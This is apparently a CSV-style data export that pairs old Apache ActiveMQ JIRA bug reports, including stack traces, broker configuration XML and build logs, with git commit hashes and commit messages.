	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:122)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:137)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:122)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:134)
	at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:134)
	at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:255)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:66)
	at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:74)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:66)
	at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:78)
	at org.apache.activemq.broker.AbstractConnection.processAddConsumer(AbstractConnection.java:413)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:275)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
	at java.lang.Thread.run(Thread.java:534)
Caused by: java.sql.SQLException: Invalid column type: getBLOB not implemented for class oracle.jdbc.driver.T4CNumberAccessor
	at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:125)
	at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:162)
	at oracle.jdbc.driver.Accessor.unimpl(Accessor.java:387)
	at oracle.jdbc.driver.Accessor.getBLOB(Accessor.java:1324)
	at oracle.jdbc.driver.OracleResultSetImpl.getBLOB(OracleResultSetImpl.java:1223)
	at oracle.jdbc.driver.OracleResultSetImpl.getBlob(OracleResultSetImpl.java:1414)
	at org.apache.commons.dbcp.DelegatingResultSet.getBlob(DelegatingResultSet.java:269)
	at org.apache.commons.dbcp.DelegatingResultSet.getBlob(DelegatingResultSet.java:269)
	at org.apache.activemq.store.jdbc.adapter.OracleJDBCAdapter.getBinaryData(OracleJDBCAdapter.java:62)
	at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doRecover(DefaultJDBCAdapter.java:343)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.recover(JDBCMessageStore.java:147)
	... 25 more",c5c1495330dbad20c2f25e4b44f017005fb97a42,https://issues.apache.org/jira/browse/AMQ-5136 - fix and test (thanks barlabanov)
12481664,AMQ-508,"When I start with activemq.bat script following error occurs. Please note that my current and default locale is Turkish. When I changed to English US it was started without any error.

C:\activemq-3.2.1\bin>
C:\activemq-3.2.1\bin>
C:\activemq-3.2.1\bin>activemq
ActiveMQ Message Broker (http://activemq.org/)

Loading Mesaage Broker from activemq.xml on the CLASSPATH
java.lang.RuntimeException: Instruction unknown: load²nstruction
        at com.sun.org.apache.bcel.internal.util.InstructionFinder.mapName(InstructionFinder.java:138)
        at com.sun.org.apache.bcel.internal.util.InstructionFinder.compilePattern(InstructionFinder.java:170)
        at com.sun.org.apache.bcel.internal.util.InstructionFinder.search(InstructionFinder.java:218)
        at com.sun.org.apache.bcel.internal.util.InstructionFinder.search(InstructionFinder.java:264)
        at com.sun.org.apache.xalan.internal.xsltc.compiler.Mode.peepHoleOptimization(Mode.java:1444)
        at com.sun.org.apache.xalan.internal.xsltc.compiler.Mode.compileApplyTemplates(Mode.java:1058)
        at com.sun.org.apache.xalan.internal.xsltc.compiler.Stylesheet.compileModes(Stylesheet.java:615)
        at com.sun.org.apache.xalan.internal.xsltc.compiler.Stylesheet.translate(Stylesheet.java:730)
        at com.sun.org.apache.xalan.internal.xsltc.compiler.XSLTC.compile(XSLTC.java:335)
        at com.sun.org.apache.xalan.internal.xsltc.compiler.XSLTC.compile(XSLTC.java:410)
        at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl.newTemplates(TransformerFactoryImpl.java:791)
        at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl.newTransformer(TransformerFactoryImpl.java:619)
        at org.activemq.spring.ActiveMQBeanDefinitionReader.createTransformer(ActiveMQBeanDefinitionReader.java:63)
        at org.activemq.spring.ActiveMQBeanDefinitionReader.transformDocument(ActiveMQBeanDefinitionReader.java:94)
        at org.activemq.spring.ActiveMQBeanDefinitionReader.registerBeanDefinitions(ActiveMQBeanDefinitionReader.java:53)
        at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:155)
        at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:86)
        at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:57)
        at org.activemq.spring.SpringBrokerContainerFactory.createBrokerContainer(SpringBrokerContainerFactory.java:86)
        at org.activemq.spring.Main.main(Main.java:71)
ERROR:  'Instruction unknown: load²nstruction'
FATAL ERROR:  'Could not compile stylesheet'
Caught: org.activemq.spring.ConfigurationParseException: Could not parse resource: class path resource [activemq.xml]. Reason: javax.xml.transform.TransformerConfigurationException: Could not compile stylesheet; nested exception is javax.xml.transform.TransformerConfigurationException: Could not compile stylesheet
org.activemq.spring.ConfigurationParseException: Could not parse resource: class path resource [activemq.xml]. Reason: javax.xml.transform.TransformerConfigurationException: Could not compile stylesheet; nested exception is javax.xml.transform.TransformerConfigurationException: Could not compile stylesheet
javax.xml.transform.TransformerConfigurationException: Could not compile stylesheet
        at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl.newTemplates(TransformerFactoryImpl.java:824)
        at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl.newTransformer(TransformerFactoryImpl.java:619)
        at org.activemq.spring.ActiveMQBeanDefinitionReader.createTransformer(ActiveMQBeanDefinitionReader.java:63)
        at org.activemq.spring.ActiveMQBeanDefinitionReader.transformDocument(ActiveMQBeanDefinitionReader.java:94)
        at org.activemq.spring.ActiveMQBeanDefinitionReader.registerBeanDefinitions(ActiveMQBeanDefinitionReader.java:53)
        at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:155)
        at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:86)
        at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:57)
        at org.activemq.spring.SpringBrokerContainerFactory.createBrokerContainer(SpringBrokerContainerFactory.java:86)
        at org.activemq.spring.Main.main(Main.java:71)
C:\activemq-3.2.1\bin>
C:\activemq-3.2.1\bin>
C:\activemq-3.2.1\bin>",a6243225c5be2f8eaa7121e9616315e1b5661483,fix the inconsistency with ElectingLevelDBStore.isMaster() under AMQ-5082 unit test conditions
12481576,AMQ-507,please refer to  http://forums.activemq.org/posts/list/111.page,582fc08019c5cab275c4abc054d0fb69c72b7fe2,"https://issues.apache.org/jira/browse/AMQ-5072

Add accessors to the persitence adapter class and a test to validate."
12481501,AMQ-504,<NA>,a165054df9c354ff17856fe8e6390c09bfdf6a2d,Added multiple @Ignores to keep this test from hanging and blocking CI builds.  AMQ-5041
12481501,AMQ-504,<NA>,706830268e1cecfe165feb444ee5b62e954e7d33,More improvements for AMQ-5043.  Drop all messages sent to topics starting '$' to honor MQTT 3.1.1 spec requirments.
12481415,AMQ-502,Diabling test until it is fixed.,1c64baadeae996c30f8729479118bd0ee7bb578c,"Disabling StompTest see https://jira.logicblaze.com/jira/browse/AMQ-502


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@371600 13f79535-47bb-0310-9956-ffa450edef68"
12481415,AMQ-502,Diabling test until it is fixed.,5a80cee9608fdf93fde7d5b132d6ddd8a9eba946,"Converted to JUnit4 because of CI hangs, see AMQ-5021"
12481415,AMQ-502,Diabling test until it is fixed.,17d1489c62b6bc33b77bce38eeecdc357f9c61bf,[AMQ-5029] embedded webconsole broker does not resolve activemq.data system property
12483288,AMQ-501,"When attempting to install the ActiveMQ RAR, these errors are thrown, and appear to be vaild and correct (verified by browsing the ActiveMQ source code). Classloading problems appear to prevent using ActiveMQ using the Foriegn JMS facility of Weblogic.

[1] The ra.xml <managedconnectionfactory-class> class 'org.activemq.ra.ActiveMQManagedConnectionFactory' must override both equals() and hashCode(), but doesn't.
[2] The ra.xml <managedconnectionfactory-class> class 'org.activemq.ra.ActiveMQManagedConnectionFactory' must override both equals() and hashCode(), but doesn't.
[3] The ra.xml <managedconnectionfactory-class> class 'org.activemq.ra.ActiveMQManagedConnectionFactory' must override both equals() and hashCode(), but doesn't.
[4] The ra.xml <activationspec-class> 'org.activemq.ra.ActiveMQActivationSpec' must implement java.io.Serializable but does not.",da3775302c68c628138a221409910ff9c4ca48a6,https://issues.apache.org/jira/browse/AMQ-5011
12481535,AMQ-500,"I have not started to look at unix based start script, but I am finding some interesting issues with the one for use under Windows (activemq.bat).

This script is using the java jar option that points to the ACTIVEMQ_HOME/bin/run.jar file.  The manifest points to the o.a.a.broker.Main class.  

Use of this execution option and review of the o.a.a.broker.Main class (where it sets up a classloader with classpath pointing to the conf, lib and lib/optional directories would lead one to believe that the o.a.a.broker.Main class would be loaded from run.jar.  This is not the case as the script also defines the java property of java.ext.dirs to append the activemq directories.  While it also sets the command line classpath option, this is useless as including all the activemq directories will already include all activemq classes at the base classloader. This also includes a copy of the o.a.a.broker.Main class that is include in the uber activemq-4.0.jar in the ACTIVEMQ_HOME directory.

Also with the definition java.ext.dirs this will total obviate any setting of classpath information on the classloader  (auto or parameter specified) by the o.a.a.broker.Main class.

Obviously something is not right here.  If  o.a.a.broker.Main class is suppose to be setting up the class loader, why is the script setting the java.ext.dir property and the classpath option on the command line?
",875822de5172607496e7bd219a177213df92b7cd,Fixes AMQ-5002: Support receiving AMQP messages which do not have the timestamp set but the expiration is set.
12481675,AMQ-497,"Reported at: http://forums.logicblaze.com/posts/list/207.page

* A QueueReceiver, running the synchronous receive() call will block indefinitely 
If you have a QueueReceiver, and it's blocked on the receive() call, it should produce an exception when the ActiveMQ server goes down. Otherwise there is no way for that thread to come back to life. The client does produce an async exception alert... However that is not sufficient. That handles any of your async consumers. This is a sync consumer, it's blocked until it returns, or fails. Your async exception routine should wake up all sync consumers with an exception on their receive() call. The user cannot do this, because even if he could somehow find which Thread is blocked, interrupting the thread is not guaranteed to work. Most JMS providers throw an exception. 3.2.1 threw an exception. Perhaps if I wrote an async exception trigger to close the Sender, it would unblock the other thread.. However the receieve should really throw an exception. ",6549342061eae34da8f25460e70d832666d730e2,"Ignoring failing test cases, see AMQ-4973"
12481675,AMQ-497,"Reported at: http://forums.logicblaze.com/posts/list/207.page

* A QueueReceiver, running the synchronous receive() call will block indefinitely 
If you have a QueueReceiver, and it's blocked on the receive() call, it should produce an exception when the ActiveMQ server goes down. Otherwise there is no way for that thread to come back to life. The client does produce an async exception alert... However that is not sufficient. That handles any of your async consumers. This is a sync consumer, it's blocked until it returns, or fails. Your async exception routine should wake up all sync consumers with an exception on their receive() call. The user cannot do this, because even if he could somehow find which Thread is blocked, interrupting the thread is not guaranteed to work. Most JMS providers throw an exception. 3.2.1 threw an exception. Perhaps if I wrote an async exception trigger to close the Sender, it would unblock the other thread.. However the receieve should really throw an exception. ",e56c062f279dc110df4707024654b2b7c40f6c1d,"Added overridden no-op version of testSendReceive, see AMQ-4975"
12481675,AMQ-497,"Reported at: http://forums.logicblaze.com/posts/list/207.page

* A QueueReceiver, running the synchronous receive() call will block indefinitely 
If you have a QueueReceiver, and it's blocked on the receive() call, it should produce an exception when the ActiveMQ server goes down. Otherwise there is no way for that thread to come back to life. The client does produce an async exception alert... However that is not sufficient. That handles any of your async consumers. This is a sync consumer, it's blocked until it returns, or fails. Your async exception routine should wake up all sync consumers with an exception on their receive() call. The user cannot do this, because even if he could somehow find which Thread is blocked, interrupting the thread is not guaranteed to work. Most JMS providers throw an exception. 3.2.1 threw an exception. Perhaps if I wrote an async exception trigger to close the Sender, it would unblock the other thread.. However the receieve should really throw an exception. ",286a5a6b498a456be73efd19b20289f1c6d2abe3,https://issues.apache.org/jira/browse/AMQ-4979 - put jolokia back in
12481461,AMQ-496,"4.0 - reliable:tcp transport (SNAPSHOT 01-12-06) 
----------------------------- 

* If you shutdown the ActiveMQ server, Consumers and Producers spin 100% cpu 
If you shutdown the ActiveMQ server, both my consumers and the producers will crank 100%. When the server is back, immediately everything will become okay again. I did a threadump of the JVM, and it wasn't blazingly obvious what was spinning all the cpu time. This is the closest I found: 
3XMTHREADINFO ""ActiveMQ Default Thread Pool Thread"" (TID:0x00002AAABF25EA00, sys_thread_t:0x00000000401101A8, state:CW, native ID:0x0000000040110208) prio=5 
4XESTACKTRACE at java/lang/Thread.sleep(Native Method) 
4XESTACKTRACE at java/lang/Thread.sleep(Thread.java:943) 
4XESTACKTRACE at org/apache/activemq/transport/failover/FailoverTransport$2.iterate(FailoverTransport.java:154) 
4XESTACKTRACE at org/apache/activemq/thread/SimpleTaskRunner.runTask(SimpleTaskRunner.java:110) 
4XESTACKTRACE at org/apache/activemq/thread/SimpleTaskRunner.access$100(SimpleTaskRunner.java:25) 
4XESTACKTRACE at org/apache/activemq/thread/SimpleTaskRunner$1.run(SimpleTaskRunner.java:42) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/Executors$RunnableAdapter.call(Executors.java:431) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/FutureTask.run(FutureTask.java:166) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:91) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:198) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668) 
4XESTACKTRACE at java/lang/Thread.run(Thread.java:816) 

However that's clearly sleeping. But, either way, something on my consumers and producers is spinning 100% cpu each. It makes moving my mouse slow because of the thread priorities :(. Obviously a big big problem if you have many consumers/producers on a single machine. Probably a simple fix. ",3af70ba285057e3a82d68bb6d8825a05f16fcdb6,"https://issues.apache.org/jira/browse/AMQ-4962

ensure immediate removal of connection MBean"
12481461,AMQ-496,"4.0 - reliable:tcp transport (SNAPSHOT 01-12-06) 
----------------------------- 

* If you shutdown the ActiveMQ server, Consumers and Producers spin 100% cpu 
If you shutdown the ActiveMQ server, both my consumers and the producers will crank 100%. When the server is back, immediately everything will become okay again. I did a threadump of the JVM, and it wasn't blazingly obvious what was spinning all the cpu time. This is the closest I found: 
3XMTHREADINFO ""ActiveMQ Default Thread Pool Thread"" (TID:0x00002AAABF25EA00, sys_thread_t:0x00000000401101A8, state:CW, native ID:0x0000000040110208) prio=5 
4XESTACKTRACE at java/lang/Thread.sleep(Native Method) 
4XESTACKTRACE at java/lang/Thread.sleep(Thread.java:943) 
4XESTACKTRACE at org/apache/activemq/transport/failover/FailoverTransport$2.iterate(FailoverTransport.java:154) 
4XESTACKTRACE at org/apache/activemq/thread/SimpleTaskRunner.runTask(SimpleTaskRunner.java:110) 
4XESTACKTRACE at org/apache/activemq/thread/SimpleTaskRunner.access$100(SimpleTaskRunner.java:25) 
4XESTACKTRACE at org/apache/activemq/thread/SimpleTaskRunner$1.run(SimpleTaskRunner.java:42) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/Executors$RunnableAdapter.call(Executors.java:431) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/FutureTask.run(FutureTask.java:166) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:91) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:198) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643) 
4XESTACKTRACE at edu/emory/mathcs/backport/java/util/concurrent/ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668) 
4XESTACKTRACE at java/lang/Thread.run(Thread.java:816) 

However that's clearly sleeping. But, either way, something on my consumers and producers is spinning 100% cpu each. It makes moving my mouse slow because of the thread priorities :(. Obviously a big big problem if you have many consumers/producers on a single machine. Probably a simple fix. ",6377d49a1c2e501b7f9daa39a4ed91e8cf4114b1,"https://issues.apache.org/jira/browse/AMQ-4967

Import activemq pool explicitly"
12481541,AMQ-494,"See servicemix test case at
https://svn.apache.org/repos/asf/incubator/servicemix/trunk/servicemix-wsn2005/src/test/java/org/apache/servicemix/wsn/component/WSNComponentTest.java

When the consumer is created, the publisher is not advisored.",7656e8262c0c0871190c01753e8b0bb8a600d8f4,https://issues.apache.org/jira/browse/AMQ-4946 - put -pool and -jms-pool in -all jar
12483301,AMQ-492,"I have been trying to get my head around the multicast discovery mechanism.  In particular its use of the FailoverTransport class is bothering me.  The issue presented itself when viewing the DEBUG level log entries that were generated after one broker of a pair, connected using this discovery mechanism, was stopped.  The FailoverTransport went into a very tight endless loop of attempts to reconnect.

My first thought to tweak the Failover properties in the network connector URI.  But alais, the uri was for the multicast not the failover.  No problem, just duplicate the failover properties on the multicast agent.  After doing so, I started to think why is failover needed at all  wont the connection be reestablished when the broker returns and advertises itself again?

Can someone comment on this issue?  Is the bug that the failover properties where not available or is the problem that failover was used at all?
",7cf5c240a260c30572729b3a1b29863b64935a44,Test to reproduce AMQ4920
12483301,AMQ-492,"I have been trying to get my head around the multicast discovery mechanism.  In particular its use of the FailoverTransport class is bothering me.  The issue presented itself when viewing the DEBUG level log entries that were generated after one broker of a pair, connected using this discovery mechanism, was stopped.  The FailoverTransport went into a very tight endless loop of attempts to reconnect.

My first thought to tweak the Failover properties in the network connector URI.  But alais, the uri was for the multicast not the failover.  No problem, just duplicate the failover properties on the multicast agent.  After doing so, I started to think why is failover needed at all  wont the connection be reestablished when the broker returns and advertises itself again?

Can someone comment on this issue?  Is the bug that the failover properties where not available or is the problem that failover was used at all?
",fe36820b86c891217db83130e8ab3e42cd762baf,https://issues.apache.org/jira/browse/AMQ-4926 - karaf version range
12481515,AMQ-491,"See output below.  Verified w/ debug on that URLs to fetch jar file are well-formed but content does not exist in the repository.  

+----------------------------------------
| Executing default ActiveMQ :: Optional
| Memory: 7M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

default:

build:end:

Attempting to download geronimo-kernel-1.0-SNAPSHOT.jar.
Attempting to download geronimo-system-1.0-SNAPSHOT.jar.
Attempting to download org.mortbay.jetty-5.1-SNAPSHOT.jar.
WARNING: Failed to download org.mortbay.jetty-5.1-SNAPSHOT.jar.

BUILD FAILED
File...... /Users/dkords/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependency:

org.mortbay.jetty-5.1-SNAPSHOT.jar

Total time   : 42 seconds 
Finished at  : Monday, January 16, 2006 10:06:42 PM PST ",cfeea7797d9f3cbd5c0685f39d8b2a9cef77d8bb,Test to reproduce AMQ-4914 with the failing part @Ignored for now
12481515,AMQ-491,"See output below.  Verified w/ debug on that URLs to fetch jar file are well-formed but content does not exist in the repository.  

+----------------------------------------
| Executing default ActiveMQ :: Optional
| Memory: 7M/9M
+----------------------------------------
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml
DEPRECATED: the default goal should be specified in the <build> section of project.xml instead of maven.xml

default:

build:end:

Attempting to download geronimo-kernel-1.0-SNAPSHOT.jar.
Attempting to download geronimo-system-1.0-SNAPSHOT.jar.
Attempting to download org.mortbay.jetty-5.1-SNAPSHOT.jar.
WARNING: Failed to download org.mortbay.jetty-5.1-SNAPSHOT.jar.

BUILD FAILED
File...... /Users/dkords/.maven/cache/maven-multiproject-plugin-1.4.1/plugin.jelly
Element... maven:reactor
Line...... 218
Column.... -1
The build cannot continue because of the following unsatisfied dependency:

org.mortbay.jetty-5.1-SNAPSHOT.jar

Total time   : 42 seconds 
Finished at  : Monday, January 16, 2006 10:06:42 PM PST ",3797da64fcd13f2b8a6458fddc02a11c8f0c1fb6,Fix for https://issues.apache.org/jira/browse/AMQ-4912
12481414,AMQ-489,"But ,If unilateralism channel it can be resumed.

I used bidirectional channel.

I have test one way channel that's no bug.but bidirectional channel cann't resume.

config one:
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE beans PUBLIC ""-//ACTIVEMQ//DTD//EN"" ""http://activemq.org/dtd/activemq.dtd"">
<beans>

<!-- ==================================================================== -->
<!-- ActiveMQ Broker Configuration -->
<!-- ==================================================================== -->
<broker name =""tao-111"">

<connector >
<tcpServerTransport uri=""tcp://localhost:61616"" backlog=""1000"" useAsyncSend=""true"" maxOutstandingMessages=""50"" />
</connector>
<connector>
<tcpServerTransport uri=""tcp://128.64.7.64:62001"" />
</connector>
<connector>
<serverTransport uri=""stomp://localhost:61626""/>
</connector>


<networkConnector>
<networkChannel uri=""reliable:tcp://128.64.7.27:62001"" />
<localPrefetchPolicy queuePrefetch=""100"" queueBrowserPrefetch=""100"" topicPrefetch=""100"" durableTopicPrefetch=""100""/>
<remotePrefetchPolicy topicPrefetch=""100"" durableTopicPrefetch=""100"" queuePrefetch=""100"" queueBrowserPrefetch=""100"" />
</networkConnector>


config two:

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE beans PUBLIC ""-//ACTIVEMQ//DTD//EN"" ""http://activemq.org/dtd/activemq.dtd"">
<beans>

<!-- ==================================================================== -->
<!-- ActiveMQ Broker Configuration -->
<!-- ==================================================================== -->
<broker name =""tao-1"">

<connector >
<tcpServerTransport uri=""tcp://localhost:61616"" backlog=""1000"" useAsyncSend=""true"" maxOutstandingMessages=""50""/>
</connector>
<connector>
<tcpServerTransport uri=""tcp://128.64.7.27:62001"" />
</connector>
<connector>
<serverTransport uri=""stomp://localhost:61626"" />
</connector>


<networkConnector>
<networkChannel uri=""reliable:tcp://128.64.7.64:62001""/>
<localPrefetchPolicy queuePrefetch=""100"" queueBrowserPrefetch=""100"" topicPrefetch=""100"" durableTopicPrefetch=""100""/>
<remotePrefetchPolicy topicPrefetch=""100"" durableTopicPrefetch=""100"" queuePrefetch=""100"" queueBrowserPrefetch=""100"" />

</networkConnector>
.... 

",a6e306437efafc13cf2c2e9d681d5685fdfbcfce,fix for: https://issues.apache.org/jira/browse/AMQ-4893
12481481,AMQ-485,"Scott posted a great bug report on the forums: http://forums.logicblaze.com/posts/list/180.page

I was running a stress test and found a bug in ActiveMQConnection. Where do I post it? 

The TCP consumer thread updates the flowControlSleepTime long between the values of -1 and 10 (consume method). 

My thread is attempting to issue an asyncsend. Within the asyncPacketSend method the value is referenced as follows: 

if (packet.isJMSMessage() && flowControlSleepTime > 0) { 
try { 
Thread.sleep(flowControlSleepTime); 
} catch (InterruptedException e) { } 
} 

this.transportChannel.asyncSend(packet); 

Typical threading issue, the value is 10 on the if and -1 on the Thread.sleep..... and my thread sleeps forever..... 

This jdk 1.5, one broker, one queue, two consumers and two producers. Each producer has one connection running all-out sends (no wait). I'm only getting about 7000 events/sec/avg through this configuration. 

This code is attempting to slow down the client based on the CapacityInfo object being sent back to the client with a 'flow control time' to wait. I'll have to try using more connections (clients) to see if I can pass the 7000 mark. 

Scott ",8f078a3f4ce0599f958c1363e55fbc966013cdba,"https://issues.apache.org/jira/browse/AMQ-4853

Add hashCode and equals override so that this object can be used in
collections properly"
12481481,AMQ-485,"Scott posted a great bug report on the forums: http://forums.logicblaze.com/posts/list/180.page

I was running a stress test and found a bug in ActiveMQConnection. Where do I post it? 

The TCP consumer thread updates the flowControlSleepTime long between the values of -1 and 10 (consume method). 

My thread is attempting to issue an asyncsend. Within the asyncPacketSend method the value is referenced as follows: 

if (packet.isJMSMessage() && flowControlSleepTime > 0) { 
try { 
Thread.sleep(flowControlSleepTime); 
} catch (InterruptedException e) { } 
} 

this.transportChannel.asyncSend(packet); 

Typical threading issue, the value is 10 on the if and -1 on the Thread.sleep..... and my thread sleeps forever..... 

This jdk 1.5, one broker, one queue, two consumers and two producers. Each producer has one connection running all-out sends (no wait). I'm only getting about 7000 events/sec/avg through this configuration. 

This code is attempting to slow down the client based on the CapacityInfo object being sent back to the client with a 'flow control time' to wait. I'll have to try using more connections (clients) to see if I can pass the 7000 mark. 

Scott ",6552287221c1706684fb2babe5d9777aabd09531,"https://issues.apache.org/jira/browse/AMQ-4853

adds a little test and preserves some performance tests if needed later."
12481471,AMQ-484,"When transport connector as follows is defined

<transportConnector uri=""tcp://localhost:61616"" discoveryUri=""multicast://default""/>

in conjuction with the broker definition of:

<broker useJmx=""true"" />

The resulting TransportConnector created by XBeans from the defintion is provided with the discoveryUri.  However, the BrokerService then replaces that instance with ManagedTransportConnector instance but does not transfer the discoveryUri.  The result is no discovery agent is created for the connector when the connector is started.


",eef92026754b0cc94c2b0ba21ece0b531b518b97,"AMQ-484: Restore discoveryUri when replacing TransportConnector with ManagedTransportConnector

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@368911 13f79535-47bb-0310-9956-ffa450edef68"
12481471,AMQ-484,"When transport connector as follows is defined

<transportConnector uri=""tcp://localhost:61616"" discoveryUri=""multicast://default""/>

in conjuction with the broker definition of:

<broker useJmx=""true"" />

The resulting TransportConnector created by XBeans from the defintion is provided with the discoveryUri.  However, the BrokerService then replaces that instance with ManagedTransportConnector instance but does not transfer the discoveryUri.  The result is no discovery agent is created for the connector when the connector is started.


",f7311567a022dcdfb00126b4931a485a8afdb134,Fixes https://issues.apache.org/jira/browse/AMQ-4840 - Invalid STOMP frame sent on websocket connections with heartbeats.
12481471,AMQ-484,"When transport connector as follows is defined

<transportConnector uri=""tcp://localhost:61616"" discoveryUri=""multicast://default""/>

in conjuction with the broker definition of:

<broker useJmx=""true"" />

The resulting TransportConnector created by XBeans from the defintion is provided with the discoveryUri.  However, the BrokerService then replaces that instance with ManagedTransportConnector instance but does not transfer the discoveryUri.  The result is no discovery agent is created for the connector when the connector is started.


",5e42bd64bcf3c1557f2f108f57124e3e066ec158,"Added no-op version of testVirtualTopicFailover, which is covered by AMQ-4842"
12481507,AMQ-478,disabling test until it's working,7c63788e1a60c7303103c54ff368ae128aca7933,Implementing AMQ-4788 - Add support for allowing the broker to partition client client load across a broker cluster using a partitioning config
12481485,AMQ-473,Disabling until fixed.,792ba1fac3dff1dd61d0b3322ed5ddc7411fd179,AMQ-4732: Added issue mangement to pom.xml.
12481530,AMQ-471,"The recent JMX querying options added the broker Main class has added a dependency on having jmx on the classpath.  Part of Main's function is to establish the classpath so that shell scripts don't have to.  We should look into breaking the Main class so that it delegates handling the command line arguments to a class that's loaded using reflection so that it can establish that right classpath.

On java 1.4

$ ./activemq 
Exception in thread ""main"" java.lang.NoClassDefFoundError: javax/management/ObjectName

",a0c1781c4e909d35030d9762eaa70cf37639a569,https://issues.apache.org/jira/browse/AMQ-4711 - totalMessageCount stat is not decremented after destination removal
12481530,AMQ-471,"The recent JMX querying options added the broker Main class has added a dependency on having jmx on the classpath.  Part of Main's function is to establish the classpath so that shell scripts don't have to.  We should look into breaking the Main class so that it delegates handling the command line arguments to a class that's loaded using reflection so that it can establish that right classpath.

On java 1.4

$ ./activemq 
Exception in thread ""main"" java.lang.NoClassDefFoundError: javax/management/ObjectName

",9c75fe7b61f4b6aac639eb692c0989372ab07594,Fix for AMQ-4717: populateJMSXUserID is not setting the JMSXUserID property on the JMS message in JMX
12481530,AMQ-471,"The recent JMX querying options added the broker Main class has added a dependency on having jmx on the classpath.  Part of Main's function is to establish the classpath so that shell scripts don't have to.  We should look into breaking the Main class so that it delegates handling the command line arguments to a class that's loaded using reflection so that it can establish that right classpath.

On java 1.4

$ ./activemq 
Exception in thread ""main"" java.lang.NoClassDefFoundError: javax/management/ObjectName

",fd67eefad63ec1676734fefa1037c1d12bdb35c4,Improve test for AMQ-4717: verify that propertyExists also works.
12481530,AMQ-471,"The recent JMX querying options added the broker Main class has added a dependency on having jmx on the classpath.  Part of Main's function is to establish the classpath so that shell scripts don't have to.  We should look into breaking the Main class so that it delegates handling the command line arguments to a class that's loaded using reflection so that it can establish that right classpath.

On java 1.4

$ ./activemq 
Exception in thread ""main"" java.lang.NoClassDefFoundError: javax/management/ObjectName

",47d198513915532e1e8a3bcb0f9a6f98f5a794dd,Fix for https://issues.apache.org/jira/browse/AMQ-4719
12481530,AMQ-471,"The recent JMX querying options added the broker Main class has added a dependency on having jmx on the classpath.  Part of Main's function is to establish the classpath so that shell scripts don't have to.  We should look into breaking the Main class so that it delegates handling the command line arguments to a class that's loaded using reflection so that it can establish that right classpath.

On java 1.4

$ ./activemq 
Exception in thread ""main"" java.lang.NoClassDefFoundError: javax/management/ObjectName

",4183e6e47c29f6d34313a83cb748b4c137b8a353,Fix for https://issues.apache.org/jira/browse/AMQ-4719
